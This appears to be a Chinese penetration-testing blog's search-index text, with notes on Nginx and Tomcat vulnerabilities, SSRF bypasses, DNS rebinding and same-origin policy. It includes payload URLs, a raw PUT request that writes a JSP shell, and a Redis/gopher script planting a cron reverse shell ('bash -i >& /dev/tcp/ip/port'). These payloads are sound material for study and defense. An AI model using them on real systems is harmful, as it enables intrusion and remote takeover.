网站用户有：百度、京东、新浪、网易、腾讯等。 Nginx 可以在大多数 Unix、 Linux 编译运行，也有 Windows 移植版。 ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:0","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"3.1 nginx 配置错误 3.1.1 CRLF 注入 CRLF：就是 CR 和 LF，分别表示回车和换行，CR 命令让打印头回到左边。LF 命令让纸前进一行。 在 HTTP 报文中，行与行之间使用 CRLF 间隔。 攻击者一旦向请求行或首部中的字段注入恶意的 CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为 HTTP 响应分漏洞。 在 Nginx 中配置文件中，有三个可以接受 URL 的变量： $URI $DOCUMENT_URI $REQUEST_URI 其中： $URI - 获取解码后的请求路径 $DOCUMENT_URI - 获取解码后的请求路径 $REQUEST_URI - 没有解码的完整的 URL 3.1.1.1 原理 Nginx会将 $uri 进行解码，导致传入 %0a%0d 即可引入换行符，造成 CRLF 注入漏洞。 错误的配置文件示例（原本的目的是为了让 http 的请求跳转到 https 上）： location / { return 302 https://$host$uri; } 3.1.1.2 漏洞复现 Payload： http://your-ip:8080/%0a%0dSet-Cookie:%20a=1，可注入 Set-Cookie 头。 3.1.2 目录穿越漏洞 Nginx 在配置别名（Alias）的时候，如果忘记加 /，将造成一个目录穿越漏洞。 错误的配置文件示例（原本的目的是为了让用户访问到 /home/ 目录下的文件）： location /files { alias /home/; } Payload:：http://your-ip:8081/files../ ，成功穿越到根目录： ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:1","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"3.2 Nginx 越界读取缓存漏洞 漏洞编号：CVE-2017-7529 影响版本：Nginx 0.5.6 - 1.13.2 漏洞危害：敏感信息泄露 3.2.1 原理 3.2.1.1 HTTP Range HTTP 的 Range，允许客户端分批次请求资源的部分，如果服务端资源较大，可以通过 Range 来并发下载；如果访问资源时网络中断，可以断点续传 Range 设置在 HTTP 请求头中，它是多个 byte-range-spec(或 suffix-range-byte-spec)的集合 示例 Range：bytes=0-1024 表示访问第 0 到第 1024 字节 Range：bytes=500-600，601-999，-300 表示分三块访问，分别是 500 到 600 字节，601 到 600 字节，最后的 300 字节; 3.2.1.2 HTTP-Cache Nginx 可以作为缓存服务器，将 Web 应用服务器返回的内容缓存起来。如果客户端请求的内容已经被缓存，那么就可以直接将缓存内容返回，而无需再次请求应用服务器。由此，可降低应用服务器的负载并提高服务的响应性能。 Cache 文件内容： 3.2.1.3 原理分析 Nginx 对 Range 的支持包括 header 处理和 body 处理，分别用来解析客户端发送过来的 Range header 和裁剪返回给客户端的请求数据 Body ngx_http_range_header_filter_module 负责对 header 数据的处理 ngx_http_range_body_filter_module 负责对 body 数据的处理 解析过程： 在 ngx_http_range_parse 函数中有这样一个循环 这段代码是要把“-”两边的数字取出分别赋值给 start 和 end 变量，字符串指针 p 中即为 bytes= 后面的内容。 在上面这段代码中存在 cutoff 和 cutlim 阈值限定了从字符串中读取时不会让 start 或 end 为负值 所以这里需要进入 suffix=1 的分支，因此使用 Range: bytes=-xxx，即省略初始 start 值的形式。 start 等于 content_length 减去 end 值，所以如果传入的 end 比实际长度还要长，就可以使 start 变为负数。最终 end 的值会被设定为 content_length - 1 通过上面的设定后，这块 range 的总长度就超过了content-length。而 Nginx对 range 总长度会有检查，但是注意到 size 的值是 multipart 的全局 range 长度相加得到 因此，一个 range 是不够的，至少需要两个 range，其长度之和溢出为负数，就可以绕过总长度的检查了。 for 循环是一个无条件的循环，有一个退出条件为 =，支持 range 的值为 start1 - end1， start2 - end2 的形式构造 range: bytes=-x, -y。一大一小两个 end 值，只需要控制前面一个 end 值小而后一个 end 值大，从而实现 star t值和 size 值皆为负数，控制 start 值负到一个合适的位置，那么就能成功读到缓存文件头部了。 3.2.2 漏洞复现 可见，越界读取到了位于「HTTP返回包体」前的「文件头」、「HTTP返回包头」等内容。 ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:2","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"3.3 Nginx 文件名逻辑漏洞 漏洞编号：CVE-2013-4547 漏洞危害：文件上传、绕过目录限制 影响版本：0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 3.3.1 原理 非法字符空格和截止符 \\0 会导致 Nginx 解析 URI 时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。 举个例子，假设服务器上存在文件：file.aaa[空格]，注意文件名的最后一个字符是空格。则可以通过访问：http://127.0.0.1/file.aaa \\0.bbb，让 Nginx 认为文件 file.aaa 的后缀为 .bbb。 3.3.2 漏洞复现 3.3.2.1 解析漏洞 Nginx 匹配到 .php 结尾的请求，就发送给 fastcgi 进行解析，常用的写法如下： location ~ \\.php$ { include fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; fastcgi_param DOCUMENT_ROOT /var/www/html; } 正常情况下（关闭 pathinfo 的情况下），只有 .php 后缀的文件才会被发送给 fastcgi 解析。 而存在 CVE-2013-4547 的情况下，我们请求 1.gif[0x20][0x00].php，这个 URI 可以匹配上正则 \\.php$，可以进入这个 Location 块；但进入后，Nginx 却错误地认为请求的文件是 1.gif[0x20]，就设置其为 SCRIPT_FILENAME 的值发送给 fastcgi。 fastcgi 根据 SCRIPT_FILENAME 的值进行解析，最后造成了解析漏洞。 所以，我们只需要上传一个空格结尾的文件，即可使 PHP 解析之。 该漏洞利用条件有两个： Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 php-fpm.conf 中的 security.limit_extensions 为空，也就是说任意后缀名都可以解析为 PHP vulhub 环境启动后，访问 http://your-ip:8080/即可看到一个上传页面。 这个环境是黑名单验证，我们无法上传php后缀的文件，需要利用 CVE-2013-4547。我们上传一个 1.gif，注意后面的空格： 访问 http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php，即可发现 PHP 已被解析： 注意，[0x20]是空格，[0x00]是 \\0，这两个字符都不需要编码。 3.3.2.2 绕过目录限制 比如很多网站限制了允许访问后台的IP： location /admin/ { allow 127.0.0.1; deny all; } 通过请求如下 URI：/test[0x20]/../admin/index.php，这个 URI 不会匹配上 location 后面的 /admin/，也就绕过了其中的 IP 验证 但最后请求的是 /test[0x20]/../admin/index.php 文件，也就是 /admin/index.php，成功访问到后台。 （这个前提是需要有一个目录叫 test：这是 Linux 系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会报文件不存在的错误， Windows 下没有这个限制） ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:3","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"3.4 Nginx 解析漏洞 漏洞危害：文件上传 影响版本： Nginx 1.x 最新版 PHP 7.x 最新版 3.4.1 原理 nginx 把以 .php 结尾的文件交给 fastcgi 处理,为此可以构造 http://ip/uploadfiles/test.png/.php，其中 test.png 是我们上传的包含 PHP 代码的图片文件。 fastcgi 在处理 .php 文件时发现文件并不存在，这时 php.ini 配置文件中 cgi.fix_pathinfo=1 发挥作用，这项配置用于修复路径，如果当前路径不存在则采用上层路径。为此这里交由 fastcgi 处理的文件就变成了 /test.png。 最重要的一点是 php-fpm.conf 中的 security.limit_extensions 配置项限制了 fastcgi 解析文件的类型(即指定什么类型的文件当做代码解析)，此项设置为空的时候才允许 fastcgi 将 .png 等文件当做代码解析。 3.4.2 漏洞复现 该漏洞与 Nginx、php 版本无关，属于用户配置不当造成的解析漏洞。 访问 http://your-ip/uploadfiles/nginx.png 和 http://your-ip/uploadfiles/nginx.png/.php 即可查看效果。 ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:4","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"4 Tomcat 安全 Tomcat 是 Apache 软件基金会的 Jakarta 项目中的一个核心项目，由 Apache、Sun 和其他一些公司及个人共同开发而成。 Tomcat 服务器是一个免费的开放源代码的 Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用。 实际上 Tomcat 是 Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行 Tomcat 时，它实际上作为一个与 Apache 独立的进程单独运行的。 ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:4:0","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"4.1 Tomcat 配置错误 漏洞编号：CVE-2017-12615 影响版本：Apahce Tomcat 7.0.0 - 7.0.79 漏洞说明：当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法，攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。 漏洞本质 Tomcat 配置了可写（readonly=false），导致我们可以往服务器写文件： \u003cservlet\u003e \u003cservlet-name\u003edefault\u003c/servlet-name\u003e \u003cservlet-class\u003eorg.apache.catalina.servlets.DefaultServlet\u003c/servlet-class\u003e \u003cinit-param\u003e \u003cparam-name\u003edebug\u003c/param-name\u003e \u003cparam-value\u003e0\u003c/param-value\u003e \u003c/init-param\u003e \u003cinit-param\u003e \u003cparam-name\u003elistings\u003c/param-name\u003e \u003cparam-value\u003efalse\u003c/param-value\u003e \u003c/init-param\u003e \u003cinit-param\u003e \u003cparam-name\u003ereadonly\u003c/param-name\u003e \u003cparam-value\u003efalse\u003c/param-value\u003e \u003c/init-param\u003e \u003cload-on-startup\u003e1\u003c/load-on-startup\u003e \u003c/servlet\u003e 虽然 Tomcat 对文件后缀有一定检测（不能直接写 jsp），但我们使用一些文件系统的特性（如 Linux 下可用 / ）来绕过了限制。 直接发送以下数据包即可在 Web 根目录写入 shell： PUT /1.jsp/ HTTP/1.1 Host: your-ip:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 5 shell ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:4:1","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"4.2 Tomcat 弱口令 Tomcat 支持在后台部署 war 文件，可以直接将 webshell 部署到 web 目录下。其中，欲访问后台，需要对应用户有相应权限。 4.2.1 Tomcat 权限 manager（后台管理） manager-gui 拥有 html 页面权限 manager-status 拥有查看 status 的权限 manager-script 拥有 text 接口的权限，和 status 权限 manager-jmx 拥有 jmx 权限，和 status 权限 host-manager（虚拟主机管理） admin-gui 拥有 html 页面权限 admin-script 拥有 text 接口权限 在 conf/tomcat-users.xml 文件中配置用户的权限： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003ctomcat-users xmlns=\"http://tomcat.apache.org/xml\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://tomcat.apache.org/xml tomcat-users.xsd\" version=\"1.0\"\u003e \u003crole rolename=\"manager-gui\"/\u003e \u003crole rolename=\"manager-script\"/\u003e \u003crole rolename=\"manager-jmx\"/\u003e \u003crole rolename=\"manager-status\"/\u003e \u003crole rolename=\"admin-gui\"/\u003e \u003crole rolename=\"admin-script\"/\u003e \u003cuser username=\"tomcat\" password=\"tomcat\" roles=\"manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script\" /\u003e \u003c/tomcat-users\u003e 可见，用户 tomcat 拥有上述所有权限，密码是 tomcat。 正常安装的情况下，tomcat8 中默认没有任何用户，且 manager 页面只允许本地 IP 访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。 4.2.2 漏洞复现 打开tomcat管理页面 http://your-ip:8080/manager/html，输入弱密码 tomcat:tomcat，即可访问后台： 上传 war 包即可直接 getshell。 ","date":"2021-01-12","objectID":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:4:2","tags":["常用","渗透测试"],"title":"WEB 容器安全","uri":"/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["常用","渗透测试"],"content":"SSRF 漏洞相关","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"SSRF 漏洞相关 ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:0:0","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1 定义与原理 ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:0","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1.1 定义 SSRF(Server-Side Request Forgery)，服务器请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下， SSRF 攻击的目标是从外网无法访问的内部系统。 SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。 ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:1","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1.2 特点 攻击者无法直接访问目标机器 2 的服务 目标机器 1 能够访问目标机器 2 的服务 目标机器 1 暴露了访问目标机器 2 的方式，攻击者能够利用 ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:2","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1.3 检测方法 因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在 SSRF 漏洞 在页面源码中查找访问的资源地址 ，如果该资源地址类型为 www.baidu.com/xxx.php?image=（地址）的就可能存在 SSRF 漏洞 ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:3","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1.4 PHP 中的相关函数 file_get_contents() fsockopen() curl_exec() ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:4","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"1.4 危害 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息 攻击运行在内网或本地的应用程序(比如溢出) 对内网 Web 应用进行指纹识别，通过访问默认文件实现 攻击内外网的 Web 应用，主要是使用 get 参数就可以实现的攻击(比如 Struts2 漏洞利用，SQL 注入等) 利用 File 协议读取本地文件 ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:1:5","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"2 绕过方法 ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:0","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"2.1 IP 绕过 加端口 短网址，但是默认情况下 CURL 命令不开启 follow 302 跳转 指向任意 IP 的域名 xip.io，127.0.0.1.xip.io IP 限制绕过 127.0.0.1 0177.0.0.1 八进制 0x7f.0.0.1 十六进制 十六进制去掉分隔符 http://0x7F000001 十进制去掉分隔符 http://2130706433 ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:1","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"2.2 其它 Tips 结合 dict:// file:// gopher:// http://www.baidu.com@192.168.0.1 以 www.baidu.com 用户名，检测是否有权限访问 192.168.0.1 的网站 短连接（301 跳转，需要能访问到外网） ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:2","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"2.3 Gopher 协议 gopher 是一个互联网上使用的分布型的文件搜集获取网络协议 gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。 gopher 协议是 ssrf 利用中一个最强大的协议(俗称万能协议)。 2.3.1 Gopher 控制 Redis 反弹 shell 前提 redis 未授权 redis 对 cron 有写权限 通过 socat 抓流量 脚本： echo -e \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/ip/port 0 \u003e\u00261\\n\\n\"|redis-cli -h $1 -p $2 -x set 1 redis-cli -h $1 -p $2 config set dir /var/spool/cron redis-cli -h $1 -p $2 config set dbfilename root redis-cli -h $1 -p $2 quit 执行：./shell.sh 127.0.0.1 4444 流量转发 socat -v tcp-listen:4444,fork tcp-connect:IP:6379 流量转换 # coding: utf-8 import sys exp = '' with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in '\u003e\u003c+': continue # 判断倒数第 2、3 字符串是否为 \\r elif line[-3:-1] == r'\\r': # 如果该行只有 \\r，将 \\r 替换成 %0a%0d%0a if len(line) == 3: exp = exp + '%0a%0d%0a' else: line = line.replace(r'\\r', '%0d%0a') # 去掉最后的换行符 line = line.replace('\\n', '') exp = exp + line # 判断是否是空行，空行替换为 %0a elif line == '\\x0a': exp = exp + '%0a' else: line = line.replace('\\n', '') exp = exp + line print exp 2.3.2 Gopher 对 Mysql 的利用 前提： 存在 SSRF 漏洞 MySQL 无密码 Gopher 协议转化 gopher://127.0.0.1:3306/_ + url 编码的登录请求 + 包长度(wireshark 抓包时可以直接看到 Packet Length) + %00%00%00%03 + 查询语句(URL 编码) + %01%00%00%00%01 2.3.3 相关工具 https://github.com/tarunkant/Gopherus ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:3","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"2.4 DNS 重绑定攻击 2.4.1 原理 一般 web 应用程序防御 SSRF 的流程如下： 获取到输入的 URL，从该 URL 中提取 host 对该 host 进行 DNS 解析，获取到解析的 IP 检测该 IP 是否是合法的，比如是否是私有 IP 等 如果 IP 检测为合法的，则进入 curl 的阶段发包 观察到，在这个流程中，一共进行了两次 DNS 解析：第一次是对 URL 的 host 进行 DNS 解析，第二次是使用 curl 发包的时候进行解析。这两次 DNS 解析是有时间差的，我们可以使用这个时间差进行绕过。 时间差对应的 DNS 中的机制是 TTL。TTL 表示 DNS 里面域名和 IP 绑定关系的 Cache 在 DNS 上存活的最长时间。即请求了域名与 IP 的关系后，请求方会缓存这个关系，缓存保持的时间就是 TTL。而缓存失效后就会删除，这时候如果重新访问域名指定的 IP 的话会重新建立匹配关系及 cache。 在上面的流程中，如果在 DNS 第二次解析的时候，我们能够更换 URL 对应的 IP，那么在 TTL 之后、缓存失效之后，重新访问此 URL 的话，就能获取被更换后的 IP。如果我们把第一次解析的 IP 设为合法 IP，就能绕过 host 合法性检查；把第二次解析的 IP 设为内网 IP，就达到了 SSRF 访问内网的目的。 总结 DNS 重绑定攻击的原理是：利用服务器两次解析同一域名的短暂间隙，更换域名背后的 ip 达到突破同源策略或过 waf 进行 ssrf 的目的。 2.4.2 实现 一些 DNS Rebinding 平台 https://lock.cmpxchg8b.com/rebinder.html https://requestrepo.com/ 手动实现 需要先添加一条 NS 记录和一条 A 记录： 记录类型 主机记录 记录值 NS test ns.geekby.xyz A ns 39.96.14.41 NS 记录表示域名 test.geekby.xyz 这个子域名指定由 ns.geekby.xyz 这个域名服务器来解析，然后 A 记录表示这个 ns.geekby.xyz 的位置在 IP 地址 39.96.14.41 上。 这里搭建 DNS 服务器采用 python 的 twisted 库中的 name 模块，代码如下： from twisted.internet import reactor, defer from twisted.names import client, dns, error, server record={} class DynamicResolver(object): def _doDynamicResponse(self, query): name = query.name.name if name not in record or record[name] \u003c 1: ip = \"127.0.0.1\" else: ip = \"1.2.3.4\" if name not in record: record[name]=0 record[name]+=1 print name+\" ===\u003e \"+ip answer = dns.RRHeader( name=name, type=dns.A, cls=dns.IN, ttl=0, payload=dns.Record_A(address=b'%s'%ip,ttl=0) ) answers = [answer] authority = [] additional = [] return answers, authority, additional def query(self, query, timeout=None): return defer.succeed(self._doDynamicResponse(query)) def main(): factory = server.DNSServerFactory( clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')] ) protocol = dns.DNSDatagramProtocol(controller=factory) reactor.listenUDP(53, protocol) reactor.run() if __name__ == '__main__': raise SystemExit(main()) 2.4.3 防御方法 通过控制两次的 DNS 查询请求的间隔低于 TTL 值，确保两次查询的结果一致。 Java 应用的默认 TTL 为 10s，这个默认配置会导致 DNS Rebinding 绕过失败。 ","date":"2021-01-11","objectID":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/:2:4","tags":["常用","渗透测试"],"title":"SSRF 漏洞相关","uri":"/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"categories":["常用","渗透测试"],"content":"同源策略相关","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/","tags":["常用","渗透测试"],"title":"同源策略","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["常用","渗透测试"],"content":"同源策略 ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:0:0","tags":["常用","渗透测试"],"title":"同源策略","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["常用","渗透测试"],"content":"1 定义与原理 ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:1:0","tags":["常用","渗透测试"],"title":"同源策略","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["常用","渗透测试"],"content":"1.1 同源定义 同源：协议、主机、端口 如果两个 URL 的协议、主机、端口都相同，则认为这两个 URL 同源 示例 http://example.cpm/dir/page.html http//example.com/dir2/page2.html 同源 https://example.com/dir/page.html 协议不同，不同源 http://example.com:81/dir/page.html 端口不同，不同源 https://other.com/dir/page.html 主机不同，不同源 域名与对应的 IP 也是不同源 ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:1:1","tags":["常用","渗透测试"],"title":"同源策略","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["常用","渗透测试"],"content":"1.2 同源策略 同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。 同源策略限制了从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。 ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:1:2","tags":["常用","渗透测试"],"title":"同源策略","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["常用","渗透测试"],"content":"1.3 跨域 简单地理解就是访问非同源资源，可以使用 HTML 标签访问，也可以使用 JS 去访问 。JS 访问非同源时，访问请求是可以发送的，但是服务端将响应送回来后我们客户端的浏览器默认不接受。 1.4 同源策略限制 非同源时 JS 会受到如下三种行为限制： Cookie、LocalStorage 和 IndexDB 无法读取 DOM 无法获得 AJAX 请求发送但是浏览器不接受返回信息 同源策略允许「跨域」写，而不允许「跨域」域读，写就是上行，发送请求，send request，读就是下行，接受响应，receive response； ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:1:3","tags":["常用","渗透测试"],"title":"同源策略","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["常用","渗透测试"],"content":"1.5 两种常用的跨域方式 1.5.1 JSONP 加载远程 JS，可以把远程 JS 中数据带进来 1.5.2 CORS 为了解决跨域资源共享而提出的在 HTTP 头部添加自定义字段的方法 在浏览器进行请求时，自动在请求头中添加 Origin 字段，服务端通过验证 Origin 字段来判断请求是否被允许，从而实现浏览器进行跨源访问 CORS 的安全问题 返回报文头部的 Access-Control-Allow-Credentials 为 True 时，这表明 Cookie 可以包含在请求中，一起发给服务器，存在安全问题 如果 Access-Control-Allow-Origin 头可控，且 Access-Control-Allow-Credentials 为 True，那么就可以利用一个可控的网站来窃取一个人的隐私信息 当主站与子站通过 CORS 建立信任关系进行资源共享时，如果攻击者控制了子站，也可以获取主站的数据。 ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:1:4","tags":["常用","渗透测试"],"title":"同源策略","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["常用","渗透测试"],"content":"2 Cookie 与 DOM 中的同源策略 ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:2:0","tags":["常用","渗透测试"],"title":"同源策略","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["常用","渗透测试"],"content":"2.1 Cookie 在同源策略的限制下，非同源的站点是不能够互相读取 Cookie 的，这个限制在父 / 子域名中同样存在。 可以看到两个站点的 Cookie 并不相同 但是，针对 Cookie 的同源策略是可以指定 domain 来允许不同站点间互相访问 Cookie 通过设置 domain 打破了浏览器对于 Cookie 的同源限制，可以通过子站点入手，通过子站获取子站的 Cookie 信息 cookie 的同源策略不区分协议与端口 ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:2:1","tags":["常用","渗透测试"],"title":"同源策略","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["常用","渗透测试"],"content":"2.2 DOM 树 在同源策略的限制下，非同源的站点是无法互相获取 DOM 的，这里以子域名之间获取 DOM 为例 通过设置 domain 打破了浏览器对于 DOM 的同源限制，可以通过子站入手，修改主站的 DOM 树 ","date":"2021-01-10","objectID":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/:2:2","tags":["常用","渗透测试"],"title":"同源策略","uri":"/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"categories":["常用","渗透测试"],"content":"3 CORS 与 CSRF 相同点： 都需要借助第三方网站 都需要借助 AJAX 的异步过程 一般都需要用户登录 不同点： 第三方网站可以利用 CORS 漏洞读取到受害者的敏感信息 第三方网站可以利用 CSRF 漏洞可以提受害者完成注入转账类的敏感操作 一般有 CORS 漏洞的地方都有 CSRF 漏洞 